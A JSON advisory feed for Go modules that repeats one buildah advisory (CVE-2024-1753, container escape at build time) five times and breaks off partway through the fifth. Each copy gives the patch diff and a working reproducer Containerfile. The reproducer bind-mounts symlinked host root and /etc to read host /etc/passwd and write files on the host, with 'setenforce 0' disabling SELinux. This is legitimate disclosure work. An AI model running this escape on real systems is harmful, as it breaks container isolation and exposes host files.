{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Go modules",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/go.json",
    "description": "Security Advisory for Go modules on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>Users running containers with root privileges allowing a container to run with read/write access to the host system files when selinux is not enabled.  With selinux enabled, some read access is allowed.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>From @nalind </p>\n<pre><code># cat /root/cve-2024-1753.diff\n--- internal/volumes/volumes.go\n+++ internal/volumes/volumes.go\n@@ -11,6 +11,7 @@ import (\n \n     \"errors\"\n \n+\t\"github.com/containers/buildah/copier\"\n     \"github.com/containers/buildah/define\"\n     \"github.com/containers/buildah/internal\"\n     internalParse \"github.com/containers/buildah/internal/parse\"\n@@ -189,7 +190,11 @@ func GetBindMount(ctx *types.SystemContext, args []string, contextDir string, st\n     // buildkit parity: support absolute path for sources from current build context\n     if contextDir != \"\" {\n         // path should be /contextDir/specified path\n-\t\tnewMount.Source = filepath.Join(contextDir, filepath.Clean(string(filepath.Separator)+newMount.Source))\n+\t\tevaluated, err := copier.Eval(contextDir, newMount.Source, copier.EvalOptions{})\n+\t\tif err != nil {\n+\t\t\treturn newMount, \"\", err\n+\t\t}\n+\t\tnewMount.Source = evaluated\n     } else {\n         // looks like its coming from `build run --mount=type=bind` allow using absolute path\n         // error out if no source is set\n</code></pre>\n<h3 id=\"reproducer\">Reproducer</h3>\n<p>Prior to testing, as root, add a memorable username to <code>/etc/passwd</code> via adduser or your favorite editor.   Also create a memorably named file in <code>/</code>.  Suggest: <code>touch /SHOULDNTSEETHIS.txt</code> and <code>adduser SHOULDNTSEETHIS</code>.  After testing, remember to remove both the file and the user from your system.</p>\n<p>Use the following Containerfile</p>\n<pre><code># cat ~/cve_Containerfile\nFROM alpine as base\n\nRUN ln -s / /rootdir\nRUN ln -s /etc /etc2\n\nFROM alpine\n\nRUN echo \"ls container root\"\nRUN ls -l /\n\nRUN echo \"With exploit show host root, not the container's root, and create /BIND_BREAKOUT in / on the host\"\nRUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit\n\nRUN echo \"With exploit show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host\"\nRUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd; cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 \n</code></pre>\n<h4 id=\"to-test\">To Test</h4>\n<h5 id=\"testing-with-an-older-version-of-buildah-with-the-issue\">Testing with an older version of Buildah with the issue</h5>\n<pre><code>setenforce 0\nbuildah build -f ~/cve_Containerfile .\n</code></pre>\n<p>As part of the printout from the build, you should be able to see the contents of the <code>/' and </code>/etc<code>directories, including the</code>/SHOULDNOTSEETHIS.txt<code>file that you created, and the contents of the</code>/etc/passwd<code>file which will include the</code>SHOULDNOTSEETHIS<code>user that you created.  In addition, the file</code>/BIND_BREAKOUT<code>and</code>/etc/BIND_BREAKOUT2` will exist on the host after the command is completed.  Be sure to remove those two files between tests.  </p>\n<pre><code>buildah rm -a\nbuildah rmi -a\nrm /BIND_BREAKOUT\nrm /etc/BIND_BREAKOUT2\nsetenforce 1\nbuildah build -f ~/cve_Containerfile .\n</code></pre>\n<p>Neither the <code>/BIND_BREAKEOUT</code> or <code>/etc/BIND_BREAKOUT2</code> files should be created.  An error should be raised during the build when both files are trying to be created.  Also, errors will be raised when the build tries to display the contents of the <code>/etc/passwd</code> file, and nothing will be displayed from that file.  </p>\n<p>However, the files in both the <code>/</code> and <code>/etc</code> directories on the host system will be displayed.</p>\n<h5 id=\"testing-with-the-patch\">Testing with the patch</h5>\n<p>Use the same commands as testing with an older version of Buildah.</p>\n<p>When running using the patched version of Buildah, regardless of the <code>setenforce</code> settings,  you should not see the file that you created or the user that you added.  Also the <code>/BIND_BREAKOUT</code> and the <code>/etc/BIND_BREAKOUT</code> will not exist on the host after the test completes.</p>\n<p>NOTE: With the fix, the contents of the <code>/</code> and <code>/etc</code> directories, and the <code>/etc/passwd</code> file will be displayed, however, it will be the file and contents from the container image, and NOT the host system.  Also the <code>/BIND_BREAKOUT</code> and <code>/etc/BIND_BREAKOUT</code> files will be created in the container image.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Ensure selinux controls are in place to avoid compromising sensitive system files and systems.  With \"setenforce 0\" set, which is not at all advised, the root file system is open for modification with this exploit.  With \"setenfoce 1\" set, which is the recommendation, files can not be changed.  However, the contents of the <code>/</code> directory can be displayed.  I.e., <code>ls -alF /</code> will show the contents of the host directory.</p>\n<h3 id=\"references\">References</h3>\n<p>Unknown.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf\">https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5\">https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087\">https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8\">https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2265513\">https://bugzilla.redhat.com/show_bug.cgi?id=2265513</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1753\">https://nvd.nist.gov/vuln/detail/CVE-2024-1753</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pmf3-c36m-g5cf\">https://github.com/advisories/GHSA-pmf3-c36m-g5cf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pmf3-c36m-g5cf",
            "title": "[github.com/containers/buildah] Container escape at build time",
            "date_modified": "2024-04-20T05:05:26.000Z",
            "date_published": "2024-03-19T20:06:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pmf3-c36m-g5cf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>Users running containers with root privileges allowing a container to run with read/write access to the host system files when selinux is not enabled.  With selinux enabled, some read access is allowed.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>From @nalind </p>\n<pre><code># cat /root/cve-2024-1753.diff\n--- internal/volumes/volumes.go\n+++ internal/volumes/volumes.go\n@@ -11,6 +11,7 @@ import (\n \n     \"errors\"\n \n+\t\"github.com/containers/buildah/copier\"\n     \"github.com/containers/buildah/define\"\n     \"github.com/containers/buildah/internal\"\n     internalParse \"github.com/containers/buildah/internal/parse\"\n@@ -189,7 +190,11 @@ func GetBindMount(ctx *types.SystemContext, args []string, contextDir string, st\n     // buildkit parity: support absolute path for sources from current build context\n     if contextDir != \"\" {\n         // path should be /contextDir/specified path\n-\t\tnewMount.Source = filepath.Join(contextDir, filepath.Clean(string(filepath.Separator)+newMount.Source))\n+\t\tevaluated, err := copier.Eval(contextDir, newMount.Source, copier.EvalOptions{})\n+\t\tif err != nil {\n+\t\t\treturn newMount, \"\", err\n+\t\t}\n+\t\tnewMount.Source = evaluated\n     } else {\n         // looks like its coming from `build run --mount=type=bind` allow using absolute path\n         // error out if no source is set\n</code></pre>\n<h3 id=\"reproducer\">Reproducer</h3>\n<p>Prior to testing, as root, add a memorable username to <code>/etc/passwd</code> via adduser or your favorite editor.   Also create a memorably named file in <code>/</code>.  Suggest: <code>touch /SHOULDNTSEETHIS.txt</code> and <code>adduser SHOULDNTSEETHIS</code>.  After testing, remember to remove both the file and the user from your system.</p>\n<p>Use the following Containerfile</p>\n<pre><code># cat ~/cve_Containerfile\nFROM alpine as base\n\nRUN ln -s / /rootdir\nRUN ln -s /etc /etc2\n\nFROM alpine\n\nRUN echo \"ls container root\"\nRUN ls -l /\n\nRUN echo \"With exploit show host root, not the container's root, and create /BIND_BREAKOUT in / on the host\"\nRUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit\n\nRUN echo \"With exploit show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host\"\nRUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd; cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 \n</code></pre>\n<h4 id=\"to-test\">To Test</h4>\n<h5 id=\"testing-with-an-older-version-of-buildah-with-the-issue\">Testing with an older version of Buildah with the issue</h5>\n<pre><code>setenforce 0\nbuildah build -f ~/cve_Containerfile .\n</code></pre>\n<p>As part of the printout from the build, you should be able to see the contents of the <code>/' and </code>/etc<code>directories, including the</code>/SHOULDNOTSEETHIS.txt<code>file that you created, and the contents of the</code>/etc/passwd<code>file which will include the</code>SHOULDNOTSEETHIS<code>user that you created.  In addition, the file</code>/BIND_BREAKOUT<code>and</code>/etc/BIND_BREAKOUT2` will exist on the host after the command is completed.  Be sure to remove those two files between tests.  </p>\n<pre><code>buildah rm -a\nbuildah rmi -a\nrm /BIND_BREAKOUT\nrm /etc/BIND_BREAKOUT2\nsetenforce 1\nbuildah build -f ~/cve_Containerfile .\n</code></pre>\n<p>Neither the <code>/BIND_BREAKEOUT</code> or <code>/etc/BIND_BREAKOUT2</code> files should be created.  An error should be raised during the build when both files are trying to be created.  Also, errors will be raised when the build tries to display the contents of the <code>/etc/passwd</code> file, and nothing will be displayed from that file.  </p>\n<p>However, the files in both the <code>/</code> and <code>/etc</code> directories on the host system will be displayed.</p>\n<h5 id=\"testing-with-the-patch\">Testing with the patch</h5>\n<p>Use the same commands as testing with an older version of Buildah.</p>\n<p>When running using the patched version of Buildah, regardless of the <code>setenforce</code> settings,  you should not see the file that you created or the user that you added.  Also the <code>/BIND_BREAKOUT</code> and the <code>/etc/BIND_BREAKOUT</code> will not exist on the host after the test completes.</p>\n<p>NOTE: With the fix, the contents of the <code>/</code> and <code>/etc</code> directories, and the <code>/etc/passwd</code> file will be displayed, however, it will be the file and contents from the container image, and NOT the host system.  Also the <code>/BIND_BREAKOUT</code> and <code>/etc/BIND_BREAKOUT</code> files will be created in the container image.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Ensure selinux controls are in place to avoid compromising sensitive system files and systems.  With \"setenforce 0\" set, which is not at all advised, the root file system is open for modification with this exploit.  With \"setenfoce 1\" set, which is the recommendation, files can not be changed.  However, the contents of the <code>/</code> directory can be displayed.  I.e., <code>ls -alF /</code> will show the contents of the host directory.</p>\n<h3 id=\"references\">References</h3>\n<p>Unknown.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf\">https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5\">https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087\">https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8\">https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2265513\">https://bugzilla.redhat.com/show_bug.cgi?id=2265513</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1753\">https://nvd.nist.gov/vuln/detail/CVE-2024-1753</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pmf3-c36m-g5cf\">https://github.com/advisories/GHSA-pmf3-c36m-g5cf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pmf3-c36m-g5cf",
            "title": "[github.com/containers/buildah] Container escape at build time",
            "date_modified": "2024-04-20T05:05:26.000Z",
            "date_published": "2024-03-19T20:06:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pmf3-c36m-g5cf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>Users running containers with root privileges allowing a container to run with read/write access to the host system files when selinux is not enabled.  With selinux enabled, some read access is allowed.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>From @nalind </p>\n<pre><code># cat /root/cve-2024-1753.diff\n--- internal/volumes/volumes.go\n+++ internal/volumes/volumes.go\n@@ -11,6 +11,7 @@ import (\n \n     \"errors\"\n \n+\t\"github.com/containers/buildah/copier\"\n     \"github.com/containers/buildah/define\"\n     \"github.com/containers/buildah/internal\"\n     internalParse \"github.com/containers/buildah/internal/parse\"\n@@ -189,7 +190,11 @@ func GetBindMount(ctx *types.SystemContext, args []string, contextDir string, st\n     // buildkit parity: support absolute path for sources from current build context\n     if contextDir != \"\" {\n         // path should be /contextDir/specified path\n-\t\tnewMount.Source = filepath.Join(contextDir, filepath.Clean(string(filepath.Separator)+newMount.Source))\n+\t\tevaluated, err := copier.Eval(contextDir, newMount.Source, copier.EvalOptions{})\n+\t\tif err != nil {\n+\t\t\treturn newMount, \"\", err\n+\t\t}\n+\t\tnewMount.Source = evaluated\n     } else {\n         // looks like its coming from `build run --mount=type=bind` allow using absolute path\n         // error out if no source is set\n</code></pre>\n<h3 id=\"reproducer\">Reproducer</h3>\n<p>Prior to testing, as root, add a memorable username to <code>/etc/passwd</code> via adduser or your favorite editor.   Also create a memorably named file in <code>/</code>.  Suggest: <code>touch /SHOULDNTSEETHIS.txt</code> and <code>adduser SHOULDNTSEETHIS</code>.  After testing, remember to remove both the file and the user from your system.</p>\n<p>Use the following Containerfile</p>\n<pre><code># cat ~/cve_Containerfile\nFROM alpine as base\n\nRUN ln -s / /rootdir\nRUN ln -s /etc /etc2\n\nFROM alpine\n\nRUN echo \"ls container root\"\nRUN ls -l /\n\nRUN echo \"With exploit show host root, not the container's root, and create /BIND_BREAKOUT in / on the host\"\nRUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit\n\nRUN echo \"With exploit show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host\"\nRUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd; cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 \n</code></pre>\n<h4 id=\"to-test\">To Test</h4>\n<h5 id=\"testing-with-an-older-version-of-buildah-with-the-issue\">Testing with an older version of Buildah with the issue</h5>\n<pre><code>setenforce 0\nbuildah build -f ~/cve_Containerfile .\n</code></pre>\n<p>As part of the printout from the build, you should be able to see the contents of the <code>/' and </code>/etc<code>directories, including the</code>/SHOULDNOTSEETHIS.txt<code>file that you created, and the contents of the</code>/etc/passwd<code>file which will include the</code>SHOULDNOTSEETHIS<code>user that you created.  In addition, the file</code>/BIND_BREAKOUT<code>and</code>/etc/BIND_BREAKOUT2` will exist on the host after the command is completed.  Be sure to remove those two files between tests.  </p>\n<pre><code>buildah rm -a\nbuildah rmi -a\nrm /BIND_BREAKOUT\nrm /etc/BIND_BREAKOUT2\nsetenforce 1\nbuildah build -f ~/cve_Containerfile .\n</code></pre>\n<p>Neither the <code>/BIND_BREAKEOUT</code> or <code>/etc/BIND_BREAKOUT2</code> files should be created.  An error should be raised during the build when both files are trying to be created.  Also, errors will be raised when the build tries to display the contents of the <code>/etc/passwd</code> file, and nothing will be displayed from that file.  </p>\n<p>However, the files in both the <code>/</code> and <code>/etc</code> directories on the host system will be displayed.</p>\n<h5 id=\"testing-with-the-patch\">Testing with the patch</h5>\n<p>Use the same commands as testing with an older version of Buildah.</p>\n<p>When running using the patched version of Buildah, regardless of the <code>setenforce</code> settings,  you should not see the file that you created or the user that you added.  Also the <code>/BIND_BREAKOUT</code> and the <code>/etc/BIND_BREAKOUT</code> will not exist on the host after the test completes.</p>\n<p>NOTE: With the fix, the contents of the <code>/</code> and <code>/etc</code> directories, and the <code>/etc/passwd</code> file will be displayed, however, it will be the file and contents from the container image, and NOT the host system.  Also the <code>/BIND_BREAKOUT</code> and <code>/etc/BIND_BREAKOUT</code> files will be created in the container image.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Ensure selinux controls are in place to avoid compromising sensitive system files and systems.  With \"setenforce 0\" set, which is not at all advised, the root file system is open for modification with this exploit.  With \"setenfoce 1\" set, which is the recommendation, files can not be changed.  However, the contents of the <code>/</code> directory can be displayed.  I.e., <code>ls -alF /</code> will show the contents of the host directory.</p>\n<h3 id=\"references\">References</h3>\n<p>Unknown.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf\">https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5\">https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087\">https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8\">https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2265513\">https://bugzilla.redhat.com/show_bug.cgi?id=2265513</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1753\">https://nvd.nist.gov/vuln/detail/CVE-2024-1753</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pmf3-c36m-g5cf\">https://github.com/advisories/GHSA-pmf3-c36m-g5cf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pmf3-c36m-g5cf",
            "title": "[github.com/containers/buildah] Container escape at build time",
            "date_modified": "2024-04-20T05:05:26.000Z",
            "date_published": "2024-03-19T20:06:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pmf3-c36m-g5cf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>Users running containers with root privileges allowing a container to run with read/write access to the host system files when selinux is not enabled.  With selinux enabled, some read access is allowed.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>From @nalind </p>\n<pre><code># cat /root/cve-2024-1753.diff\n--- internal/volumes/volumes.go\n+++ internal/volumes/volumes.go\n@@ -11,6 +11,7 @@ import (\n \n     \"errors\"\n \n+\t\"github.com/containers/buildah/copier\"\n     \"github.com/containers/buildah/define\"\n     \"github.com/containers/buildah/internal\"\n     internalParse \"github.com/containers/buildah/internal/parse\"\n@@ -189,7 +190,11 @@ func GetBindMount(ctx *types.SystemContext, args []string, contextDir string, st\n     // buildkit parity: support absolute path for sources from current build context\n     if contextDir != \"\" {\n         // path should be /contextDir/specified path\n-\t\tnewMount.Source = filepath.Join(contextDir, filepath.Clean(string(filepath.Separator)+newMount.Source))\n+\t\tevaluated, err := copier.Eval(contextDir, newMount.Source, copier.EvalOptions{})\n+\t\tif err != nil {\n+\t\t\treturn newMount, \"\", err\n+\t\t}\n+\t\tnewMount.Source = evaluated\n     } else {\n         // looks like its coming from `build run --mount=type=bind` allow using absolute path\n         // error out if no source is set\n</code></pre>\n<h3 id=\"reproducer\">Reproducer</h3>\n<p>Prior to testing, as root, add a memorable username to <code>/etc/passwd</code> via adduser or your favorite editor.   Also create a memorably named file in <code>/</code>.  Suggest: <code>touch /SHOULDNTSEETHIS.txt</code> and <code>adduser SHOULDNTSEETHIS</code>.  After testing, remember to remove both the file and the user from your system.</p>\n<p>Use the following Containerfile</p>\n<pre><code># cat ~/cve_Containerfile\nFROM alpine as base\n\nRUN ln -s / /rootdir\nRUN ln -s /etc /etc2\n\nFROM alpine\n\nRUN echo \"ls container root\"\nRUN ls -l /\n\nRUN echo \"With exploit show host root, not the container's root, and create /BIND_BREAKOUT in / on the host\"\nRUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit\n\nRUN echo \"With exploit show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host\"\nRUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd; cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 \n</code></pre>\n<h4 id=\"to-test\">To Test</h4>\n<h5 id=\"testing-with-an-older-version-of-buildah-with-the-issue\">Testing with an older version of Buildah with the issue</h5>\n<pre><code>setenforce 0\nbuildah build -f ~/cve_Containerfile .\n</code></pre>\n<p>As part of the printout from the build, you should be able to see the contents of the <code>/' and </code>/etc<code>directories, including the</code>/SHOULDNOTSEETHIS.txt<code>file that you created, and the contents of the</code>/etc/passwd<code>file which will include the</code>SHOULDNOTSEETHIS<code>user that you created.  In addition, the file</code>/BIND_BREAKOUT<code>and</code>/etc/BIND_BREAKOUT2` will exist on the host after the command is completed.  Be sure to remove those two files between tests.  </p>\n<pre><code>buildah rm -a\nbuildah rmi -a\nrm /BIND_BREAKOUT\nrm /etc/BIND_BREAKOUT2\nsetenforce 1\nbuildah build -f ~/cve_Containerfile .\n</code></pre>\n<p>Neither the <code>/BIND_BREAKEOUT</code> or <code>/etc/BIND_BREAKOUT2</code> files should be created.  An error should be raised during the build when both files are trying to be created.  Also, errors will be raised when the build tries to display the contents of the <code>/etc/passwd</code> file, and nothing will be displayed from that file.  </p>\n<p>However, the files in both the <code>/</code> and <code>/etc</code> directories on the host system will be displayed.</p>\n<h5 id=\"testing-with-the-patch\">Testing with the patch</h5>\n<p>Use the same commands as testing with an older version of Buildah.</p>\n<p>When running using the patched version of Buildah, regardless of the <code>setenforce</code> settings,  you should not see the file that you created or the user that you added.  Also the <code>/BIND_BREAKOUT</code> and the <code>/etc/BIND_BREAKOUT</code> will not exist on the host after the test completes.</p>\n<p>NOTE: With the fix, the contents of the <code>/</code> and <code>/etc</code> directories, and the <code>/etc/passwd</code> file will be displayed, however, it will be the file and contents from the container image, and NOT the host system.  Also the <code>/BIND_BREAKOUT</code> and <code>/etc/BIND_BREAKOUT</code> files will be created in the container image.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Ensure selinux controls are in place to avoid compromising sensitive system files and systems.  With \"setenforce 0\" set, which is not at all advised, the root file system is open for modification with this exploit.  With \"setenfoce 1\" set, which is the recommendation, files can not be changed.  However, the contents of the <code>/</code> directory can be displayed.  I.e., <code>ls -alF /</code> will show the contents of the host directory.</p>\n<h3 id=\"references\">References</h3>\n<p>Unknown.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf\">https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5\">https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087\">https://github.com/containers/buildah/commit/3deda19137f5dec0285bbb832bd93c22d860b087</a></li>\n<li><a href=\"https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8\">https://github.com/containers/buildah/commit/a030f7b8cd373075affef1f86de43a87e502f3d8</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2265513\">https://bugzilla.redhat.com/show_bug.cgi?id=2265513</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1753\">https://nvd.nist.gov/vuln/detail/CVE-2024-1753</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pmf3-c36m-g5cf\">https://github.com/advisories/GHSA-pmf3-c36m-g5cf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pmf3-c36m-g5cf",
            "title": "[github.com/containers/buildah] Container escape at build time",
            "date_modified": "2024-04-20T05:05:26.000Z",
            "date_published": "2024-03-19T20:06:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pmf3-c36m-g5cf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>Users running containers with root privileges allowing a container to run with read/write access to the host system files when selinux is not enabled.  With selinux enabled, some read access is allowed.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>From @nalind </p>\n<pre><code># cat /root/cve-2024-1753.diff\n--- internal/volumes/volumes.go\n+++ internal/volumes/volumes.go\n@@ -11,6 +11,7 @@ import (\n \n     \"errors\"\n \n+\t\"github.com/containers/buildah/copier\"\n     \"github.com/containers/buildah/define\"\n     \"github.com/containers/buildah/internal\"\n     internalParse \"github.com/containers/buildah/internal/parse\"\n@@ -189,7 +190,11 @@ func GetBindMount(ctx *types.SystemContext, args []string, contextDir string, st\n     // buildkit parity: support absolute path for sources from current build context\n     if contextDir != \"\" {\n         // path should be /contextDir/specified path\n-\t\tnewMount.Source = filepath.Join(contextDir, filepath.Clean(string(filepath.Separator)+newMount.Source))\n+\t\tevaluated, err := copier.Eval(contextDir, newMount.Source, copier.EvalOptions{})\n+\t\tif err != nil {\n+\t\t\treturn newMount, \"\", err\n+\t\t}\n+\t\tnewMount.Source = evaluated\n     } else {\n         // looks like its coming from `build run --mount=type=bind` allow using absolute path\n         // error out if no source is set\n</code></pre>\n<h3 id=\"reproducer\">Reproducer</h3>\n<p>Prior to testing, as root, add a memorable username to <code>/etc/passwd</code> via adduser or your favorite editor.   Also create a memorably named file in <code>/</code>.  Suggest: <code>touch /SHOULDNTSEETHIS.txt</code> and <code>adduser SHOULDNTSEETHIS</code>.  After testing, remember to remove both the file and the user from your system.</p>\n<p>Use the following Containerfile</p>\n<pre><code># cat ~/cve_Containerfile\nFROM alpine as base\n\nRUN ln -s / /rootdir\nRUN ln -s /etc /etc2\n\nFROM alpine\n\nRUN echo \"ls container root\"\nRUN ls -l /\n\nRUN echo \"With exploit show host root, not the container's root, and create /BIND_BREAKOUT in / on the host\"\nRUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit\n\nRUN echo \"With exploit show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host\"\nRUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd; cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 \n</code></pre>\n<h4 id=\"to-test\">To Test</h4>\n<h5 id=\"testing-with-an-older-version-of-buildah-with-the-issue\">Testing with an older version of Buildah with the issue</h5>\n<pre><code>setenforce 0\nbuildah build -f ~/cve_Containerfile .\n</code></pre>\n<p>As part of the printout from the build, you should be able to see the contents of the <code>/' and </code>/etc<code>directories, including the</code>/SHOULDNOTSEETHIS.txt<code>file that you created, and the contents of the</code>/etc/passwd<code>file which will include the</code>SHOULDNOTSEETHIS<code>user that you created.  In addition, the file</code>/BIND_BREAKOUT<code>and</code>/etc/BIND_BREAKOUT2` will exist on the host after the command is completed.  Be sure to remove those two files between tests.  </p>\n<pre><code>buildah rm -a\nbuildah rmi -a\nrm /BIND_BREAKOUT\nrm /etc/BIND_BREAKOUT2\nsetenforce 1\nbuildah build -f ~/cve_Containerfile .\n</code></pre>\n<p>Neither the <code>/BIND_BREAKEOUT</code> or <code>/etc/BIND_BREAKOUT2</code> files should be created.  An error should be raised during the build when both files are trying to be created.  Also, errors will be raised when the build tries to display the contents of the <code>/etc/passwd</code> file, and nothing will be displayed from that file.  </p>\n<p>However, the files in both the <code>/</code> and <code>/etc</code> directories on the host system will be displayed.</p>\n<h5 id=\"testing-with-the-patch\">Testing with the patch</h5>\n<p>Use the same commands as testing with an older version of Buildah.</p>\n<p>When running using the patched version of Buildah, regardless of the <code>setenforce</code> settings,  you should not see the file that you created or the user that you added.  Also the <code>/BIND_BREAKOUT</code> and the <code>/etc/BIND_BREAKOUT</code> will not exist on the host after the test completes.</p>\n<p>NOTE: With the fix, the contents of the <code>/</code> and <code>/etc</code> directories, and the <code>/etc/passwd</code> file will be displayed, however, it will be the file and contents from the container image, and NOT the host system.  Also the <code>/BIND_BREAKOUT</code> and <code>/etc/BIND_BREAKOUT</code> files will be created in the container image.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Ensure selinux controls are in place to avoid compromising sensitive system files and systems.  With \"setenforce 0\" set, which is not at all advised, the root file system is open for modification with this exploit.  With 